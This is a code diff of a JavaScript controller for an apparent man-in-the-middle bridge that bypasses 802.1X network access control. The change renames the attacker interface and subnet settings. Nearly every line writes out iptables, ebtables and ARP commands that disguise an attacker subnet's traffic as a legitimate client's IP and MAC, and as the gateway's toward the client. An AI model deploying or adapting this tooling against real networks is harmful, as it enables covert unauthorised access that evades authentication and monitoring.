@@ -42,9 +42,10 @@ class BridgeControllerAdapted extends EventEmitter {
     this.mitm_nic2 = config.mitm_supplicant_if; // e.g., lan1 (to trusted supplicant)
 
     // Subnet for attacker machines (e.g., "172.16.100.0/24")
-    this.attacker_bridge_subnet = config.attacker_bridge_subnet;
-    // Name of the attacker bridge interface
-    this.attacker_bridge_name = config.attacker_bridge_name || "attk_br";
+    this.attacker_subnet = config.attacker_subnet; // Renamed from attacker_bridge_subnet
+    // Name of the physical attacker interface
+    this.attacker_if = config.attacker_if; // e.g., enp4s0 or lan2
+    // this.attacker_bridge_name = config.attacker_bridge_name || "attk_br"; // Removed
 
     // Other existing config parameters
     this.ephemeral_ports = config.ephemeral_ports || '61000-62000';
@@ -92,16 +93,10 @@ class BridgeControllerAdapted extends EventEmitter {
     // Set default OUTPUT policies to DROP
     // The dolos_run.sh script will handle IP forwarding, so BPI-R3 can still route if needed.
     // These rules prevent the BPI-R3 from initiating traffic from its MitM bridge IPs/MACs directly.
+    // These rules prevent the BPI-R3 from initiating traffic from its MitM bridge IPs/MACs directly.
     os_cmd('Use "policy" to allow loopback traffic', `iptables -A OUTPUT -o lo -j ACCEPT`) // Allow loopback first
 
-    // --- Add specific ACCEPT rules for DHCP server BEFORE setting default DROP ---
-    if (this.attacker_bridge_name) {
-        // Allow DHCP server replies (out UDP port 67 -> 68)
-        os_cmd(`Allow OUTPUT DHCP Offer/ACK on ${this.attacker_bridge_name}`, `iptables -A OUTPUT -o ${this.attacker_bridge_name} -p udp --sport 67 --dport 68 -j ACCEPT`);
-        // Allow related ebtables traffic if needed (might not be strictly necessary if iptables rule works, but safer)
-        os_cmd(`Allow OUTPUT L2 for DHCP Offer/ACK on ${this.attacker_bridge_name}`, `ebtables -A OUTPUT -o ${this.attacker_bridge_name} -p IPv4 --ip-proto udp --ip-sport 67 --ip-dport 68 -j ACCEPT`);
-    }
-    // --- End of added lines ---
+    // --- Removed specific DHCP rules, will use generic ACCEPT for attacker_if later ---
 
     // Set default OUTPUT policies to DROP (These lines remain)
     os_cmd('Use "policy" to drop all outbound IP traffic from this device by default', `iptables -P OUTPUT DROP`)
@@ -117,22 +112,21 @@ class BridgeControllerAdapted extends EventEmitter {
     // Example: os_cmd('Allow OUTPUT on management_if', `iptables -A OUTPUT -o ${this.config.mgmt_if} -j ACCEPT`)
     // For simplicity, we'll keep the original loop but note its dependency on 'interfaces' variable.
     for(const iface in interfaces){
-      // Exclude MitM bridge, its physical member interfaces, and the attacker bridge from this generic ACCEPT rule.
+      // Exclude MitM bridge, its physical member interfaces, and the physical attacker interface from this generic ACCEPT rule.
       // Traffic for these will be handled by specific rules later (e.g., SNAT or explicit ACCEPT).
-      if(![this.mitm_bridge_name, this.mitm_nic1, this.mitm_nic2, this.attacker_bridge_name].includes(iface)){
+      if(![this.mitm_bridge_name, this.mitm_nic1, this.mitm_nic2, this.attacker_if].includes(iface)){
         os_cmd(`Allow OUTPUT on non-involved interface: ${iface}`, `ebtables -A OUTPUT -o ${iface} -j ACCEPT`)
         os_cmd(`Allow OUTPUT on non-involved interface: ${iface}`, `iptables -A OUTPUT -o ${iface} -j ACCEPT`)
         os_cmd(`Allow OUTPUT on non-involved interface: ${iface}`, `arptables -A OUTPUT -o ${iface} -j ACCEPT`)
       }
     }
 
-    // Explicitly allow all OUTPUT traffic on the attacker bridge (needed for DHCP server, DNS, etc.)
-    // Commented out as we added specific DHCP rules earlier. If other services on attk_br need OUTPUT, uncomment or add specific rules.
-    // if (this.attacker_bridge_name) {
-    //     os_cmd(`Allow OUTPUT on attacker bridge: ${this.attacker_bridge_name}`, `iptables -A OUTPUT -o ${this.attacker_bridge_name} -j ACCEPT`);
-    //     os_cmd(`Allow OUTPUT on attacker bridge: ${this.attacker_bridge_name}`, `ebtables -A OUTPUT -o ${this.attacker_bridge_name} -j ACCEPT`);
-    //     // os_cmd(`Allow OUTPUT on attacker bridge: ${this.attacker_bridge_name}`, `arptables -A OUTPUT -o ${this.attacker_bridge_name} -j ACCEPT`); // Likely not needed for DHCP server
-    // }
+    // Explicitly allow all OUTPUT traffic on the physical attacker interface (needed for DHCP server, DNS, etc.)
+    if (this.attacker_if) {
+        os_cmd(`Allow OUTPUT on attacker interface: ${this.attacker_if}`, `iptables -A OUTPUT -o ${this.attacker_if} -j ACCEPT`);
+        os_cmd(`Allow OUTPUT on attacker interface: ${this.attacker_if}`, `ebtables -A OUTPUT -o ${this.attacker_if} -j ACCEPT`);
+        // os_cmd(`Allow OUTPUT on attacker interface: ${this.attacker_if}`, `arptables -A OUTPUT -o ${this.attacker_if} -j ACCEPT`); // Likely not needed for DHCP server
+    }
 
 
     // Granular blocks for specific EtherTypes on OUTPUT (preventing BPI-R3 from sending these itself)
@@ -235,8 +229,8 @@ class BridgeControllerAdapted extends EventEmitter {
     // This loop might be redundant if policies are set to ACCEPT.
     // However, it ensures specific ACCEPT rules if other default policies were different.
     for(const iface in interfaces){
-       // Exclude MitM bridge, its physical member interfaces, and the attacker bridge
-      if(![this.mitm_bridge_name, this.mitm_nic1, this.mitm_nic2, this.attacker_bridge_name].includes(iface)){
+       // Exclude MitM bridge, its physical member interfaces, and the physical attacker interface
+      if(![this.mitm_bridge_name, this.mitm_nic1, this.mitm_nic2, this.attacker_if].includes(iface)){
         os_cmd(`Ensure OUTPUT allowed on non-involved interface: ${iface}`, `ebtables -A OUTPUT -o ${iface} -j ACCEPT || true`);
         os_cmd(`Ensure OUTPUT allowed on non-involved interface: ${iface}`, `iptables -A OUTPUT -o ${iface} -j ACCEPT || true`);
         os_cmd(`Ensure OUTPUT allowed on non-involved interface: ${iface}`, `arptables -A OUTPUT -o ${iface} -j ACCEPT || true`);
@@ -277,17 +271,17 @@ class BridgeControllerAdapted extends EventEmitter {
       `ebtables -t nat -A POSTROUTING -s ${this.mitm_bridge_mac} -o ${this.gateway_side_interface} -j snat --snat-arp --to-src ${info.client_mac}`)
     //Mask TCP Traffic
     os_cmd('Tag all traffic leaving the attacker subnet towards the switch with the client\'s IP and NAT using ephemeral ports for tcp',
-      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.attacker_bridge_subnet} -p tcp -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
+      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.attacker_subnet} -p tcp -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
     os_cmd('Tag all traffic leaving the MitM bridge (from its APIPA IP) towards the switch with the client\'s IP and NAT for tcp',
       `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.mitm_bridge_apipa_subnet} -p tcp -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
     //Mask UDP Traffic
     os_cmd('Tag all traffic leaving the attacker subnet towards the switch with the client\'s IP and NAT for udp',
-      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.attacker_bridge_subnet} -p udp -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
+      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.attacker_subnet} -p udp -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
     os_cmd('Tag all traffic leaving the MitM bridge (from its APIPA IP) towards the switch with the client\'s IP and NAT for udp',
       `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.mitm_bridge_apipa_subnet} -p udp -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
     //Mask iCMP Traffic
     os_cmd('Tag all traffic leaving the attacker subnet towards the switch with the client\'s IP for icmp',
-      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.attacker_bridge_subnet} -p icmp -j SNAT --to ${info.client_ip}`)
+      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.attacker_subnet} -p icmp -j SNAT --to ${info.client_ip}`)
     os_cmd('Tag all traffic leaving the MitM bridge (from its APIPA IP) towards the switch with the client\'s IP for icmp',
       `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.mitm_bridge_apipa_subnet} -p icmp -j SNAT --to ${info.client_ip}`)
 
@@ -299,7 +293,7 @@ class BridgeControllerAdapted extends EventEmitter {
 //      `iptables -t nat -A POSTROUTING -p udp -s ${this.mitm_bridge_apipa_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
 //    os_cmd('Tag icmp tcp traffic from the bridge not destined for the client with the client\'s ip',
 //      `iptables -t nat -A POSTROUTING -p icmp -s ${this.mitm_bridge_apipa_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}`)
-//    os_cmd('Drop all inbound DHCP requests from our attacker subnet', `iptables -t filter -I FORWARD -p udp -s ${this.attacker_bridge_subnet} --dport 67 -j DROP`)
+//    os_cmd('Drop all inbound DHCP requests from our attacker subnet', `iptables -t filter -I FORWARD -p udp -s ${this.attacker_subnet} --dport 67 -j DROP`)
     //we don't need to know the gateway's real IP to use it ;)
     os_cmd('Create a fake arp neighbor with an IP on our MitM bridge that maps to the same mac as the real gateway',
       `ip neigh add ${this.virtual_gateway_ip} lladdr ${info.gateway_mac} dev ${this.mitm_bridge_name}`)
@@ -336,11 +330,11 @@ class BridgeControllerAdapted extends EventEmitter {
     //  `echo 1 > /proc/sys/net/ipv4/ip_forward`)
 
 //    os_cmd('Add attacker subnet to spoof rules for tcp',
-//      `iptables -t nat -A POSTROUTING -p tcp -s ${this.attacker_bridge_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
+//      `iptables -t nat -A POSTROUTING -p tcp -s ${this.attacker_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
 //    os_cmd('Add attacker subnet to spoof rules for udp',
-//      `iptables -t nat -A POSTROUTING -p udp -s ${this.attacker_bridge_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
+//      `iptables -t nat -A POSTROUTING -p udp -s ${this.attacker_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
 //    os_cmd('Add attacker subnet to spoof rules for icmp',
-//      `iptables -t nat -A POSTROUTING -p icmp -s ${this.attacker_bridge_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}`)
+//      `iptables -t nat -A POSTROUTING -p icmp -s ${this.attacker_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}`)
      os_cmd('Open up OUTPUT communication from BPI-R3 towards the switch via the identified gateway-side interface of MitM bridge',
       `ebtables -A OUTPUT -o ${this.gateway_side_interface} -j ACCEPT`)
      os_cmd('Allow traffic originating from BPI-R3 (MitM bridge APIPA IP) to leave on the MitM bridge interface',
@@ -359,17 +353,17 @@ class BridgeControllerAdapted extends EventEmitter {
     os_cmd('Tag all communication from the MitM bridge (APIPA) towards the client with the gateway\'s IP address and NAT for tcp',
       `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.mitm_bridge_apipa_subnet} -d ${info.client_ip} -p tcp -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
     os_cmd('Tag all communication from the attacker subnet towards the client with the gateway\'s IP address and NAT for tcp',
-      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.attacker_bridge_subnet} -d ${info.client_ip} -p tcp -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
+      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.attacker_subnet} -d ${info.client_ip} -p tcp -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
     //Mask UDP
     os_cmd('Tag all communication from the MitM bridge (APIPA) towards the client with the gateway\'s IP address and NAT for udp',
       `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.mitm_bridge_apipa_subnet} -d ${info.client_ip} -p udp -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
     os_cmd('Tag all communication from the attacker subnet towards the client with the gateway\'s IP address and NAT for udp', // Corrected -p udp
-      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.attacker_bridge_subnet} -d ${info.client_ip} -p udp -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
+      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.attacker_subnet} -d ${info.client_ip} -p udp -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
     //Mask ICMP
     os_cmd('Tag all communication from the MitM bridge (APIPA) towards the client with the gateway\'s IP address for icmp',
       `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.mitm_bridge_apipa_subnet} -d ${info.client_ip} -p icmp -j SNAT --to ${info.gateway_ip}`)
     os_cmd('Tag all communication from the attacker subnet towards the client with the gateway\'s IP address for icmp',
-      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.attacker_bridge_subnet} -d ${info.client_ip} -p icmp -j SNAT --to ${info.gateway_ip}`)
+      `iptables -t nat -A POSTROUTING -o ${this.mitm_bridge_name} -s ${this.attacker_subnet} -d ${info.client_ip} -p icmp -j SNAT --to ${info.gateway_ip}`)
     os_cmd('Open up OUTPUT communication from BPI-R3 towards the client via the identified client-side interface of MitM bridge',
       `ebtables -A OUTPUT -o ${this.client_side_interface} -j ACCEPT`)
 
@@ -382,11 +376,11 @@ class BridgeControllerAdapted extends EventEmitter {
 //    os_cmd('Tag all icmp traffic from the bridge to the client with the gateway\'s ip',
 //      `iptables -t nat -A POSTROUTING -p icmp -s ${this.mitm_bridge_apipa_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}`)
 //    os_cmd('Add attacker subnet to spoof rules for client connections over tcp',
-//      `iptables -t nat -A POSTROUTING -p tcp -s ${this.attacker_bridge_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
+//      `iptables -t nat -A POSTROUTING -p tcp -s ${this.attacker_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
 //    os_cmd('Add attacker subnet to spoof rules for client connections over udp',
-//      `iptables -t nat -A POSTROUTING -p udp -s ${this.attacker_bridge_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
+//      `iptables -t nat -A POSTROUTING -p udp -s ${this.attacker_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
 //    os_cmd('Add attacker subnet to spoof rules for client connections over icmp',
-//       `iptables -t nat -A POSTROUTING -p icmp -s ${this.attacker_bridge_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}`)
+//       `iptables -t nat -A POSTROUTING -p icmp -s ${this.attacker_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}`)
   }
 
   send_dhcp_probe(){
